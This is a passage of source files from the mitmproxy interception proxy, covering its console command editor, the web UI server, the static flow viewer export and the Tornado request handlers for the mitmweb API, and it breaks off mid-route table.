self.cbuf.set_text(new_text)\n            self.cbuf.cursor = cursor_pos\n        elif key == \"backspace\":\n            self.cbuf.backspace()\n            if self.cbuf.text == \"\":\n                self.active_filter = False\n                self.master.commands.call(\"commands.history.filter\", \"\")\n                self.filter_str = \"\"\n        elif key == \"left\" or key == \"ctrl b\":\n            self.cbuf.left()\n        elif key == \"right\" or key == \"ctrl f\":\n            self.cbuf.right()\n        elif key == \"up\" or key == \"ctrl p\":\n            if self.active_filter is False:\n                self.active_filter = True\n                self.filter_str = self.cbuf.text\n                self.master.commands.call(\"commands.history.filter\", self.cbuf.text)\n            cmd = self.master.commands.execute(\"commands.history.prev\")\n            self.cbuf = CommandBuffer(self.master, cmd)\n        elif key == \"down\" or key == \"ctrl n\":\n            prev_cmd = self.cbuf.text\n            cmd = self.master.commands.execute(\"commands.history.next\")\n\n            if cmd == \"\":\n                if prev_cmd == self.filter_str:\n                    self.cbuf = CommandBuffer(self.master, prev_cmd)\n                else:\n                    self.active_filter = False\n                    self.master.commands.call(\"commands.history.filter\", \"\")\n                    self.filter_str = \"\"\n                    self.cbuf = CommandBuffer(self.master, \"\")\n            else:\n                self.cbuf = CommandBuffer(self.master, cmd)\n        elif key == \"shift tab\":\n            self.cbuf.cycle_completion(False)\n        elif key == \"tab\":\n            self.cbuf.cycle_completion()\n        elif len(key) == 1:\n            self.cbuf.insert(key)\n        self.update()\n\n    def update(self) -> None:\n        self._w.set_text([self.leader, self.cbuf.render()])\n\n    def render(self, size, focus=False) -> urwid.Canvas:\n        (maxcol,) = size\n        canv = self._w.render((maxcol,))\n        canv = urwid.CompositeCanvas(canv)\n        canv.cursor = self.get_cursor_coords((maxcol,))\n        return canv\n\n    def get_cursor_coords(self, size) -> tuple[int, int]:\n        p = self.cbuf.cursor + len(self.leader)\n        trans = self._w.get_line_translation(size[0])\n        x, y = calc_coords(self._w.get_text()[0], trans, p)\n        return x, y\n\n    def get_edit_text(self) -> str:\n        return self.cbuf.text\n", "mitmproxy/tools/console/commander/__init__.py": "", "mitmproxy/tools/web/webaddons.py": "import logging\nimport webbrowser\nfrom collections.abc import Sequence\n\nfrom mitmproxy import ctx\n\n\nclass WebAddon:\n    def load(self, loader):\n        loader.add_option(\"web_open_browser\", bool, True, \"Start a browser.\")\n        loader.add_option(\"web_debug\", bool, False, \"Enable mitmweb debugging.\")\n        loader.add_option(\"web_port\", int, 8081, \"Web UI port.\")\n        loader.add_option(\"web_host\", str, \"127.0.0.1\", \"Web UI host.\")\n        loader.add_option(\n            \"web_columns\",\n            Sequence[str],\n            [\"tls\", \"icon\", \"path\", \"method\", \"status\", \"size\", \"time\"],\n            \"Columns to show in the flow list\",\n        )\n\n    def running(self):\n        if hasattr(ctx.options, \"web_open_browser\") and ctx.options.web_open_browser:\n            web_url = f\"http://{ctx.options.web_host}:{ctx.options.web_port}/\"\n            success = open_browser(web_url)\n            if not success:\n                logging.info(\n                    f\"No web browser found. Please open a browser and point it to {web_url}\",\n                )\n\n\ndef open_browser(url: str) -> bool:\n    \"\"\"\n    Open a URL in a browser window.\n    In contrast to webbrowser.open, we limit the list of suitable browsers.\n    This gracefully degrades to a no-op on headless servers, where webbrowser.open\n    would otherwise open lynx.\n\n    Returns:\n        True, if a browser has been opened\n        False, if no suitable browser has been found.\n    \"\"\"\n    browsers = (\n        \"windows-default\",\n        \"macosx\",\n        \"wslview %s\",\n        \"gio\",\n        \"x-www-browser\",\n        \"gnome-open %s\",\n        \"xdg-open\",\n        \"google-chrome\",\n        \"chrome\",\n        \"chromium\",\n        \"chromium-browser\",\n        \"firefox\",\n        \"opera\",\n        \"safari\",\n    )\n    for browser in browsers:\n        try:\n            b = webbrowser.get(browser)\n        except webbrowser.Error:\n            pass\n        else:\n            if b.open(url):\n                return True\n    return False\n", "mitmproxy/tools/web/master.py": "import errno\nimport logging\n\nimport tornado.httpserver\nimport tornado.ioloop\n\nfrom mitmproxy import addons\nfrom mitmproxy import flow\nfrom mitmproxy import log\nfrom mitmproxy import master\nfrom mitmproxy import options\nfrom mitmproxy import optmanager\nfrom mitmproxy.addons import errorcheck\nfrom mitmproxy.addons import eventstore\nfrom mitmproxy.addons import intercept\nfrom mitmproxy.addons import readfile\nfrom mitmproxy.addons import view\nfrom mitmproxy.addons.proxyserver import Proxyserver\nfrom mitmproxy.tools.web import app\nfrom mitmproxy.tools.web import static_viewer\nfrom mitmproxy.tools.web import webaddons\n\nlogger = logging.getLogger(__name__)\n\n\nclass WebMaster(master.Master):\n    def __init__(self, opts: options.Options, with_termlog: bool = True):\n        super().__init__(opts, with_termlog=with_termlog)\n        self.view = view.View()\n        self.view.sig_view_add.connect(self._sig_view_add)\n        self.view.sig_view_remove.connect(self._sig_view_remove)\n        self.view.sig_view_update.connect(self._sig_view_update)\n        self.view.sig_view_refresh.connect(self._sig_view_refresh)\n\n        self.events = eventstore.EventStore()\n        self.events.sig_add.connect(self._sig_events_add)\n        self.events.sig_refresh.connect(self._sig_events_refresh)\n\n        self.options.changed.connect(self._sig_options_update)\n\n        self.addons.add(*addons.default_addons())\n        self.addons.add(\n            webaddons.WebAddon(),\n            intercept.Intercept(),\n            readfile.ReadFileStdin(),\n            static_viewer.StaticViewer(),\n            self.view,\n            self.events,\n            errorcheck.ErrorCheck(),\n        )\n        self.app = app.Application(self, self.options.web_debug)\n        self.proxyserver: Proxyserver = self.addons.get(\"proxyserver\")\n        self.proxyserver.servers.changed.connect(self._sig_servers_changed)\n\n    def _sig_view_add(self, flow: flow.Flow) -> None:\n        app.ClientConnection.broadcast(\n            resource=\"flows\", cmd=\"add\", data=app.flow_to_json(flow)\n        )\n\n    def _sig_view_update(self, flow: flow.Flow) -> None:\n        app.ClientConnection.broadcast(\n            resource=\"flows\", cmd=\"update\", data=app.flow_to_json(flow)\n        )\n\n    def _sig_view_remove(self, flow: flow.Flow, index: int) -> None:\n        app.ClientConnection.broadcast(resource=\"flows\", cmd=\"remove\", data=flow.id)\n\n    def _sig_view_refresh(self) -> None:\n        app.ClientConnection.broadcast(resource=\"flows\", cmd=\"reset\")\n\n    def _sig_events_add(self, entry: log.LogEntry) -> None:\n        app.ClientConnection.broadcast(\n            resource=\"events\", cmd=\"add\", data=app.logentry_to_json(entry)\n        )\n\n    def _sig_events_refresh(self) -> None:\n        app.ClientConnection.broadcast(resource=\"events\", cmd=\"reset\")\n\n    def _sig_options_update(self, updated: set[str]) -> None:\n        options_dict = optmanager.dump_dicts(self.options, updated)\n        app.ClientConnection.broadcast(\n            resource=\"options\", cmd=\"update\", data=options_dict\n        )\n\n    def _sig_servers_changed(self) -> None:\n        app.ClientConnection.broadcast(\n            resource=\"state\",\n            cmd=\"update\",\n            data={\"servers\": [s.to_json() for s in self.proxyserver.servers]},\n        )\n\n    async def running(self):\n        # Register tornado with the current event loop\n        tornado.ioloop.IOLoop.current()\n\n        # Add our web app.\n        http_server = tornado.httpserver.HTTPServer(\n            self.app, max_buffer_size=2**32\n        )  # 4GB\n        try:\n            http_server.listen(self.options.web_port, self.options.web_host)\n        except OSError as e:\n            message = f\"Web server failed to listen on {self.options.web_host or '*'}:{self.options.web_port} with {e}\"\n            if e.errno == errno.EADDRINUSE:\n                message += f\"\\nTry specifying a different port by using `--set web_port={self.options.web_port + 2}`.\"\n            raise OSError(e.errno, message, e.filename) from e\n\n        logger.info(\n            f\"Web server listening at http://{self.options.web_host}:{self.options.web_port}/\",\n        )\n\n        return await super().running()\n", "mitmproxy/tools/web/static_viewer.py": "import json\nimport logging\nimport os.path\nimport pathlib\nimport shutil\nimport time\nfrom collections.abc import Iterable\nfrom typing import Optional\n\nfrom mitmproxy import contentviews\nfrom mitmproxy import ctx\nfrom mitmproxy import flow\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\nfrom mitmproxy import io\nfrom mitmproxy import version\nfrom mitmproxy.tools.web.app import flow_to_json\n\nweb_dir = pathlib.Path(__file__).absolute().parent\n\n\ndef save_static(path: pathlib.Path) -> None:\n    \"\"\"\n    Save the files for the static web view.\n    \"\"\"\n    # We want to overwrite the static files to keep track of the update.\n    if (path / \"static\").exists():\n        shutil.rmtree(str(path / \"static\"))\n    shutil.copytree(str(web_dir / \"static\"), str(path / \"static\"))\n    shutil.copyfile(str(web_dir / \"templates\" / \"index.html\"), str(path / \"index.html\"))\n\n    with open(str(path / \"static\" / \"static.js\"), \"w\") as f:\n        f.write(\"MITMWEB_STATIC = true;\")\n\n\ndef save_filter_help(path: pathlib.Path) -> None:\n    with open(str(path / \"filter-help.json\"), \"w\") as f:\n        json.dump(dict(commands=flowfilter.help), f)\n\n\ndef save_settings(path: pathlib.Path) -> None:\n    with open(str(path / \"settings.json\"), \"w\") as f:\n        json.dump(dict(version=version.VERSION), f)\n\n\ndef save_flows(path: pathlib.Path, flows: Iterable[flow.Flow]) -> None:\n    with open(str(path / \"flows.json\"), \"w\") as f:\n        json.dump([flow_to_json(f) for f in flows], f)\n\n\ndef save_flows_content(path: pathlib.Path, flows: Iterable[flow.Flow]) -> None:\n    for f in flows:\n        assert isinstance(f, http.HTTPFlow)\n        for m in (\"request\", \"response\"):\n            message = getattr(f, m)\n            message_path = path / \"flows\" / f.id / m\n            os.makedirs(str(message_path / \"content\"), exist_ok=True)\n\n            with open(str(message_path / \"content.data\"), \"wb\") as content_file:\n                # don't use raw_content here as this is served with a default content type\n                if message:\n                    content_file.write(message.content)\n                else:\n                    content_file.write(b\"No content.\")\n\n            # content_view\n            t = time.time()\n            if message:\n                description, lines, error = contentviews.get_message_content_view(\n                    \"Auto\", message, f\n                )\n            else:\n                description, lines = \"No content.\", []\n            if time.time() - t > 0.1:\n                logging.info(\n                    f\"Slow content view: {description.strip()} took {round(time.time() - t, 1)}s\",\n                )\n            with open(\n                str(message_path / \"content\" / \"Auto.json\"), \"w\"\n            ) as content_view_file:\n                json.dump(\n                    dict(lines=list(lines), description=description), content_view_file\n                )\n\n\nclass StaticViewer:\n    # TODO: make this a command at some point.\n    def load(self, loader):\n        loader.add_option(\n            \"web_static_viewer\",\n            Optional[str],\n            \"\",\n            \"The path to output a static viewer.\",\n        )\n\n    def configure(self, updated):\n        if \"web_static_viewer\" in updated and ctx.options.web_static_viewer:\n            flows = io.read_flows_from_paths([ctx.options.rfile])\n            p = pathlib.Path(ctx.options.web_static_viewer).expanduser()\n            self.export(p, flows)\n\n    def export(self, path: pathlib.Path, flows: Iterable[flow.Flow]) -> None:\n        save_static(path)\n        save_filter_help(path)\n        save_flows(path, flows)\n        save_flows_content(path, flows)\n", "mitmproxy/tools/web/__init__.py": "from mitmproxy.tools.web import master\n\n__all__ = [\"master\"]\n", "mitmproxy/tools/web/app.py": "from __future__ import annotations\n\nimport asyncio\nimport hashlib\nimport json\nimport logging\nimport os.path\nimport re\nfrom collections.abc import Callable\nfrom collections.abc import Sequence\nfrom io import BytesIO\nfrom itertools import islice\nfrom typing import ClassVar\n\nimport tornado.escape\nimport tornado.web\nimport tornado.websocket\n\nimport mitmproxy.flow\nimport mitmproxy.tools.web.master\nfrom mitmproxy import certs\nfrom mitmproxy import command\nfrom mitmproxy import contentviews\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\nfrom mitmproxy import io\nfrom mitmproxy import log\nfrom mitmproxy import optmanager\nfrom mitmproxy import version\nfrom mitmproxy.dns import DNSFlow\nfrom mitmproxy.http import HTTPFlow\nfrom mitmproxy.tcp import TCPFlow\nfrom mitmproxy.tcp import TCPMessage\nfrom mitmproxy.udp import UDPFlow\nfrom mitmproxy.udp import UDPMessage\nfrom mitmproxy.utils.emoji import emoji\nfrom mitmproxy.utils.strutils import always_str\nfrom mitmproxy.websocket import WebSocketMessage\n\n\ndef cert_to_json(certs: Sequence[certs.Cert]) -> dict | None:\n    if not certs:\n        return None\n    cert = certs[0]\n    return {\n        \"keyinfo\": cert.keyinfo,\n        \"sha256\": cert.fingerprint().hex(),\n        \"notbefore\": int(cert.notbefore.timestamp()),\n        \"notafter\": int(cert.notafter.timestamp()),\n        \"serial\": str(cert.serial),\n        \"subject\": cert.subject,\n        \"issuer\": cert.issuer,\n        \"altnames\": [str(x.value) for x in cert.altnames],\n    }\n\n\ndef flow_to_json(flow: mitmproxy.flow.Flow) -> dict:\n    \"\"\"\n    Remove flow message content and cert to save transmission space.\n    Args:\n        flow: The original flow.\n    Sync with web/src/flow.ts.\n    \"\"\"\n    f = {\n        \"id\": flow.id,\n        \"intercepted\": flow.intercepted,\n        \"is_replay\": flow.is_replay,\n        \"type\": flow.type,\n        \"modified\": flow.modified(),\n        \"marked\": emoji.get(flow.marked, \"\ud83d\udd34\") if flow.marked else \"\",\n        \"comment\": flow.comment,\n        \"timestamp_created\": flow.timestamp_created,\n    }\n\n    if flow.client_conn:\n        f[\"client_conn\"] = {\n            \"id\": flow.client_conn.id,\n            \"peername\": flow.client_conn.peername,\n            \"sockname\": flow.client_conn.sockname,\n            \"tls_established\": flow.client_conn.tls_established,\n            \"cert\": cert_to_json(flow.client_conn.certificate_list),\n            \"sni\": flow.client_conn.sni,\n            \"cipher\": flow.client_conn.cipher,\n            \"alpn\": always_str(flow.client_conn.alpn, \"ascii\", \"backslashreplace\"),\n            \"tls_version\": flow.client_conn.tls_version,\n            \"timestamp_start\": flow.client_conn.timestamp_start,\n            \"timestamp_tls_setup\": flow.client_conn.timestamp_tls_setup,\n            \"timestamp_end\": flow.client_conn.timestamp_end,\n        }\n\n    if flow.server_conn:\n        f[\"server_conn\"] = {\n            \"id\": flow.server_conn.id,\n            \"peername\": flow.server_conn.peername,\n            \"sockname\": flow.server_conn.sockname,\n            \"address\": flow.server_conn.address,\n            \"tls_established\": flow.server_conn.tls_established,\n            \"cert\": cert_to_json(flow.server_conn.certificate_list),\n            \"sni\": flow.server_conn.sni,\n            \"cipher\": flow.server_conn.cipher,\n            \"alpn\": always_str(flow.server_conn.alpn, \"ascii\", \"backslashreplace\"),\n            \"tls_version\": flow.server_conn.tls_version,\n            \"timestamp_start\": flow.server_conn.timestamp_start,\n            \"timestamp_tcp_setup\": flow.server_conn.timestamp_tcp_setup,\n            \"timestamp_tls_setup\": flow.server_conn.timestamp_tls_setup,\n            \"timestamp_end\": flow.server_conn.timestamp_end,\n        }\n    if flow.error:\n        f[\"error\"] = flow.error.get_state()\n\n    if isinstance(flow, HTTPFlow):\n        content_length: int | None\n        content_hash: str | None\n\n        if flow.request.raw_content is not None:\n            content_length = len(flow.request.raw_content)\n            content_hash = hashlib.sha256(flow.request.raw_content).hexdigest()\n        else:\n            content_length = None\n            content_hash = None\n        f[\"request\"] = {\n            \"method\": flow.request.method,\n            \"scheme\": flow.request.scheme,\n            \"host\": flow.request.host,\n            \"port\": flow.request.port,\n            \"path\": flow.request.path,\n            \"http_version\": flow.request.http_version,\n            \"headers\": tuple(flow.request.headers.items(True)),\n            \"contentLength\": content_length,\n            \"contentHash\": content_hash,\n            \"timestamp_start\": flow.request.timestamp_start,\n            \"timestamp_end\": flow.request.timestamp_end,\n            \"pretty_host\": flow.request.pretty_host,\n        }\n        if flow.response:\n            if flow.response.raw_content is not None:\n                content_length = len(flow.response.raw_content)\n                content_hash = hashlib.sha256(flow.response.raw_content).hexdigest()\n            else:\n                content_length = None\n                content_hash = None\n            f[\"response\"] = {\n                \"http_version\": flow.response.http_version,\n                \"status_code\": flow.response.status_code,\n                \"reason\": flow.response.reason,\n                \"headers\": tuple(flow.response.headers.items(True)),\n                \"contentLength\": content_length,\n                \"contentHash\": content_hash,\n                \"timestamp_start\": flow.response.timestamp_start,\n                \"timestamp_end\": flow.response.timestamp_end,\n            }\n            if flow.response.data.trailers:\n                f[\"response\"][\"trailers\"] = tuple(\n                    flow.response.data.trailers.items(True)\n                )\n\n        if flow.websocket:\n            f[\"websocket\"] = {\n                \"messages_meta\": {\n                    \"contentLength\": sum(\n                        len(x.content) for x in flow.websocket.messages\n                    ),\n                    \"count\": len(flow.websocket.messages),\n                    \"timestamp_last\": flow.websocket.messages[-1].timestamp\n                    if flow.websocket.messages\n                    else None,\n                },\n                \"closed_by_client\": flow.websocket.closed_by_client,\n                \"close_code\": flow.websocket.close_code,\n                \"close_reason\": flow.websocket.close_reason,\n                \"timestamp_end\": flow.websocket.timestamp_end,\n            }\n    elif isinstance(flow, (TCPFlow, UDPFlow)):\n        f[\"messages_meta\"] = {\n            \"contentLength\": sum(len(x.content) for x in flow.messages),\n            \"count\": len(flow.messages),\n            \"timestamp_last\": flow.messages[-1].timestamp if flow.messages else None,\n        }\n    elif isinstance(flow, DNSFlow):\n        f[\"request\"] = flow.request.to_json()\n        if flow.response:\n            f[\"response\"] = flow.response.to_json()\n\n    return f\n\n\ndef logentry_to_json(e: log.LogEntry) -> dict:\n    return {\n        \"id\": id(e),  # we just need some kind of id.\n        \"message\": e.msg,\n        \"level\": e.level,\n    }\n\n\nclass APIError(tornado.web.HTTPError):\n    pass\n\n\nclass RequestHandler(tornado.web.RequestHandler):\n    application: Application\n\n    def write(self, chunk: str | bytes | dict | list):\n        # Writing arrays on the top level is ok nowadays.\n        # http://flask.pocoo.org/docs/0.11/security/#json-security\n        if isinstance(chunk, list):\n            chunk = tornado.escape.json_encode(chunk)\n            self.set_header(\"Content-Type\", \"application/json; charset=UTF-8\")\n        super().write(chunk)\n\n    def set_default_headers(self):\n        super().set_default_headers()\n        self.set_header(\"Server\", version.MITMPROXY)\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.add_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.add_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.add_header(\n            \"Content-Security-Policy\",\n            \"default-src 'self'; \"\n            \"connect-src 'self' ws:; \"\n            \"style-src   'self' 'unsafe-inline'\",\n        )\n\n    @property\n    def json(self):\n        if not self.request.headers.get(\"Content-Type\", \"\").startswith(\n            \"application/json\"\n        ):\n            raise APIError(400, \"Invalid Content-Type, expected application/json.\")\n        try:\n            return json.loads(self.request.body.decode())\n        except Exception as e:\n            raise APIError(400, f\"Malformed JSON: {str(e)}\")\n\n    @property\n    def filecontents(self):\n        \"\"\"\n        Accept either a multipart/form file upload or just take the plain request body.\n\n        \"\"\"\n        if self.request.files:\n            return next(iter(self.request.files.values()))[0].body\n        else:\n            return self.request.body\n\n    @property\n    def view(self) -> mitmproxy.addons.view.View:\n        return self.application.master.view\n\n    @property\n    def master(self) -> mitmproxy.tools.web.master.WebMaster:\n        return self.application.master\n\n    @property\n    def flow(self) -> mitmproxy.flow.Flow:\n        flow_id = str(self.path_kwargs[\"flow_id\"])\n        # FIXME: Add a facility to addon.view to safely access the store\n        flow = self.view.get_by_id(flow_id)\n        if flow:\n            return flow\n        else:\n            raise APIError(404, \"Flow not found.\")\n\n    def write_error(self, status_code: int, **kwargs):\n        if \"exc_info\" in kwargs and isinstance(kwargs[\"exc_info\"][1], APIError):\n            self.finish(kwargs[\"exc_info\"][1].log_message)\n        else:\n            super().write_error(status_code, **kwargs)\n\n\nclass IndexHandler(RequestHandler):\n    def get(self):\n        token = self.xsrf_token  # https://github.com/tornadoweb/tornado/issues/645\n        assert token\n        self.render(\"index.html\")\n\n\nclass FilterHelp(RequestHandler):\n    def get(self):\n        self.write(dict(commands=flowfilter.help))\n\n\nclass WebSocketEventBroadcaster(tornado.websocket.WebSocketHandler):\n    # raise an error if inherited class doesn't specify its own instance.\n    connections: ClassVar[set[WebSocketEventBroadcaster]]\n    _send_tasks: ClassVar[set[asyncio.Task]] = set()\n\n    def open(self):\n        self.connections.add(self)\n\n    def on_close(self):\n        self.connections.discard(self)\n\n    @classmethod\n    def send(cls, conn: WebSocketEventBroadcaster, message: bytes) -> None:\n        async def wrapper():\n            try:\n                await conn.write_message(message)\n            except tornado.websocket.WebSocketClosedError:\n                cls.connections.discard(conn)\n\n        t = asyncio.create_task(wrapper())\n        cls._send_tasks.add(t)\n        t.add_done_callback(cls._send_tasks.remove)\n\n    @classmethod\n    def broadcast(cls, **kwargs):\n        message = json.dumps(kwargs, ensure_ascii=False).encode(\n            \"utf8\", \"surrogateescape\"\n        )\n\n        for conn in cls.connections.copy():\n            cls.send(conn, message)\n\n\nclass ClientConnection(WebSocketEventBroadcaster):\n    connections: ClassVar[set] = set()\n\n\nclass Flows(RequestHandler):\n    def get(self):\n        self.write([flow_to_json(f) for f in self.view])\n\n\nclass DumpFlows(RequestHandler):\n    def get(self) -> None:\n        self.set_header(\"Content-Disposition\", \"attachment; filename=flows\")\n        self.set_header(\"Content-Type\", \"application/octet-stream\")\n\n        match: Callable[[mitmproxy.flow.Flow], bool]\n        try:\n            match = flowfilter.parse(self.request.arguments[\"filter\"][0].decode())\n        except ValueError:  # thrown py flowfilter.parse if filter is invalid\n            raise APIError(400, f\"Invalid filter argument / regex\")\n        except (\n            KeyError,\n            IndexError,\n        ):  # Key+Index: [\"filter\"][0] can fail, if it's not set\n\n            def match(_) -> bool:\n                return True\n\n        with BytesIO() as bio:\n            fw = io.FlowWriter(bio)\n            for f in self.view:\n                if match(f):\n                    fw.add(f)\n            self.write(bio.getvalue())\n\n    async def post(self):\n        self.view.clear()\n        bio = BytesIO(self.filecontents)\n        for f in io.FlowReader(bio).stream():\n            await self.master.load_flow(f)\n        bio.close()\n\n\nclass ClearAll(RequestHandler):\n    def post(self):\n        self.view.clear()\n        self.master.events.clear()\n\n\nclass ResumeFlows(RequestHandler):\n    def post(self):\n        for f in self.view:\n            if not f.intercepted:\n                continue\n            f.resume()\n            self.view.update([f])\n\n\nclass KillFlows(RequestHandler):\n    def post(self):\n        for f in self.view:\n            if f.killable:\n                f.kill()\n                self.view.update([f])\n\n\nclass ResumeFlow(RequestHandler):\n    def post(self, flow_id):\n        self.flow.resume()\n        self.view.update([self.flow])\n\n\nclass KillFlow(RequestHandler):\n    def post(self, flow_id):\n        if self.flow.killable:\n            self.flow.kill()\n            self.view.update([self.flow])\n\n\nclass FlowHandler(RequestHandler):\n    def delete(self, flow_id):\n        if self.flow.killable:\n            self.flow.kill()\n        self.view.remove([self.flow])\n\n    def put(self, flow_id) -> None:\n        flow: mitmproxy.flow.Flow = self.flow\n        flow.backup()\n        try:\n            for a, b in self.json.items():\n                if a == \"request\" and hasattr(flow, \"request\"):\n                    request: mitmproxy.http.Request = flow.request\n                    for k, v in b.items():\n                        if k in [\"method\", \"scheme\", \"host\", \"path\", \"http_version\"]:\n                            setattr(request, k, str(v))\n                        elif k == \"port\":\n                            request.port = int(v)\n                        elif k == \"headers\":\n                            request.headers.clear()\n                            for header in v:\n                                request.headers.add(*header)\n                        elif k == \"trailers\":\n                            if request.trailers is not None:\n                                request.trailers.clear()\n                            else:\n                                request.trailers = mitmproxy.http.Headers()\n                            for trailer in v:\n                                request.trailers.add(*trailer)\n                        elif k == \"content\":\n                            request.text = v\n                        else:\n                            raise APIError(400, f\"Unknown update request.{k}: {v}\")\n\n                elif a == \"response\" and hasattr(flow, \"response\"):\n                    response: mitmproxy.http.Response = flow.response\n                    for k, v in b.items():\n                        if k in [\"msg\", \"http_version\"]:\n                            setattr(response, k, str(v))\n                        elif k == \"code\":\n                            response.status_code = int(v)\n                        elif k == \"headers\":\n                            response.headers.clear()\n                            for header in v:\n                                response.headers.add(*header)\n                        elif k == \"trailers\":\n                            if response.trailers is not None:\n                                response.trailers.clear()\n                            else:\n                                response.trailers = mitmproxy.http.Headers()\n                            for trailer in v:\n                                response.trailers.add(*trailer)\n                        elif k == \"content\":\n                            response.text = v\n                        else:\n                            raise APIError(400, f\"Unknown update response.{k}: {v}\")\n                elif a == \"marked\":\n                    flow.marked = b\n                elif a == \"comment\":\n                    flow.comment = b\n                else:\n                    raise APIError(400, f\"Unknown update {a}: {b}\")\n        except APIError:\n            flow.revert()\n            raise\n        self.view.update([flow])\n\n\nclass DuplicateFlow(RequestHandler):\n    def post(self, flow_id):\n        f = self.flow.copy()\n        self.view.add([f])\n        self.write(f.id)\n\n\nclass RevertFlow(RequestHandler):\n    def post(self, flow_id):\n        if self.flow.modified():\n            self.flow.revert()\n            self.view.update([self.flow])\n\n\nclass ReplayFlow(RequestHandler):\n    def post(self, flow_id):\n        self.master.commands.call(\"replay.client\", [self.flow])\n\n\nclass FlowContent(RequestHandler):\n    def post(self, flow_id, message):\n        self.flow.backup()\n        message = getattr(self.flow, message)\n        message.content = self.filecontents\n        self.view.update([self.flow])\n\n    def get(self, flow_id, message):\n        message = getattr(self.flow, message)\n        assert isinstance(self.flow, HTTPFlow)\n\n        original_cd = message.headers.get(\"Content-Disposition\", None)\n        filename = None\n        if original_cd:\n            if m := re.search(r'filename=([-\\w\" .()]+)', original_cd):\n                filename = m.group(1)\n        if not filename:\n            filename = self.flow.request.path.split(\"?\")[0].split(\"/\")[-1]\n\n        filename = re.sub(r'[^-\\w\" .()]', \"\", filename)\n        cd = f\"attachment; filename={filename}\"\n        self.set_header(\"Content-Disposition\", cd)\n        self.set_header(\"Content-Type\", \"application/text\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.write(message.get_content(strict=False))\n\n\nclass FlowContentView(RequestHandler):\n    def message_to_json(\n        self,\n        viewname: str,\n        message: http.Message | TCPMessage | UDPMessage | WebSocketMessage,\n        flow: HTTPFlow | TCPFlow | UDPFlow,\n        max_lines: int | None = None,\n    ):\n        description, lines, error = contentviews.get_message_content_view(\n            viewname, message, flow\n        )\n        if error:\n            logging.error(error)\n        if max_lines:\n            lines = islice(lines, max_lines)\n\n        return dict(\n            lines=list(lines),\n            description=description,\n        )\n\n    def get(self, flow_id, message, content_view) -> None:\n        flow = self.flow\n        assert isinstance(flow, (HTTPFlow, TCPFlow, UDPFlow))\n\n        if self.request.arguments.get(\"lines\"):\n            max_lines = int(self.request.arguments[\"lines\"][0])\n        else:\n            max_lines = None\n\n        if message == \"messages\":\n            messages: list[TCPMessage] | list[UDPMessage] | list[WebSocketMessage]\n            if isinstance(flow, HTTPFlow) and flow.websocket:\n                messages = flow.websocket.messages\n            elif isinstance(flow, (TCPFlow, UDPFlow)):\n                messages = flow.messages\n            else:\n                raise APIError(400, f\"This flow has no messages.\")\n            msgs = []\n            for m in messages:\n                d = self.message_to_json(content_view, m, flow, max_lines)\n                d[\"from_client\"] = m.from_client\n                d[\"timestamp\"] = m.timestamp\n                msgs.append(d)\n                if max_lines:\n                    max_lines -= len(d[\"lines\"])\n                    if max_lines <= 0:\n                        break\n            self.write(msgs)\n        else:\n            message = getattr(self.flow, message)\n            self.write(self.message_to_json(content_view, message, flow, max_lines))\n\n\nclass Commands(RequestHandler):\n    def get(self) -> None:\n        commands = {}\n        for name, cmd in self.master.commands.commands.items():\n            commands[name] = {\n                \"help\": cmd.help,\n                \"parameters\": [\n                    {\n                        \"name\": param.name,\n                        \"type\": command.typename(param.type),\n                        \"kind\": str(param.kind),\n                    }\n                    for param in cmd.parameters\n                ],\n                \"return_type\": command.typename(cmd.return_type)\n                if cmd.return_type\n                else None,\n                \"signature_help\": cmd.signature_help(),\n            }\n        self.write(commands)\n\n\nclass ExecuteCommand(RequestHandler):\n    def post(self, cmd: str):\n        # TODO: We should parse query strings here, this API is painful.\n        try:\n            args = self.json[\"arguments\"]\n        except APIError:\n            args = []\n        try:\n            result = self.master.commands.call_strings(cmd, args)\n        except Exception as e:\n            self.write({\"error\": str(e)})\n        else:\n            self.write(\n                {\n                    \"value\": result,\n                    # \"type\": command.typename(type(result)) if result is not None else \"none\"\n                }\n            )\n\n\nclass Events(RequestHandler):\n    def get(self):\n        self.write([logentry_to_json(e) for e in self.master.events.data])\n\n\nclass Options(RequestHandler):\n    def get(self):\n        self.write(optmanager.dump_dicts(self.master.options))\n\n    def put(self):\n        update = self.json\n        try:\n            self.master.options.update(**update)\n        except Exception as err:\n            raise APIError(400, f\"{err}\")\n\n\nclass SaveOptions(RequestHandler):\n    def post(self):\n        # try:\n        #     optmanager.save(self.master.options, CONFIG_PATH, True)\n        # except Exception as err:\n        #     raise APIError(400, \"{}\".format(err))\n        pass\n\n\nclass DnsRebind(RequestHandler):\n    def get(self):\n        raise tornado.web.HTTPError(\n            403,\n            reason=\"To protect against DNS rebinding, mitmweb can only be accessed by IP at the moment. \"\n            \"(https://github.com/mitmproxy/mitmproxy/issues/3234)\",\n        )\n\n\nclass State(RequestHandler):\n    # Separate method for testability.\n    @staticmethod\n    def get_json(master: mitmproxy.tools.web.master.WebMaster):\n        return {\n            \"version\": version.VERSION,\n            \"contentViews\": [v.name for v in contentviews.views if v.name != \"Query\"],\n            \"servers\": [s.to_json() for s in master.proxyserver.servers],\n        }\n\n    def get(self):\n        self.write(State.get_json(self.master))\n\n\nclass GZipContentAndFlowFiles(tornado.web.GZipContentEncoding):\n    CONTENT_TYPES = {\n        \"application/octet-stream\",\n        *tornado.web.GZipContentEncoding.CONTENT_TYPES,\n    }\n\n\nclass Application(tornado.web.Application):\n    master: mitmproxy.tools.web.master.WebMaster\n\n    def __init__(\n        self, master: mitmproxy.tools.web.master.WebMaster, debug: bool\n    ) -> None:\n        self.master = master\n        super().__init__(\n            default_host=\"dns-rebind-protection\",\n            template_path=os.path.join(os.path.dirname(__file__), \"templates\"),\n            static_path=os.path.join(os.path.dirname(__file__), \"static\"),\n            xsrf_cookies=True,\n            cookie_secret=os.urandom(256),\n            debug=debug,\n            autoreload=False,\n            transforms=[GZipContentAndFlowFiles],\n        )\n\n        self.add_handlers(\"dns-rebind-protection\", [(r\"/.*\", DnsRebind)])\n        self.add_handlers(\n            # make mitmweb accessible by IP only to prevent DNS rebinding.\n            r\"^(localhost|[0-9.]+|\\[[0-9a-fA-F:]+\\])$\",\n            [\n                (r\"/\", IndexHandler),\n                (r\"/filter-help(?:\\.json)?\", FilterHelp),\n                (r\"/updates\", ClientConnection),\n                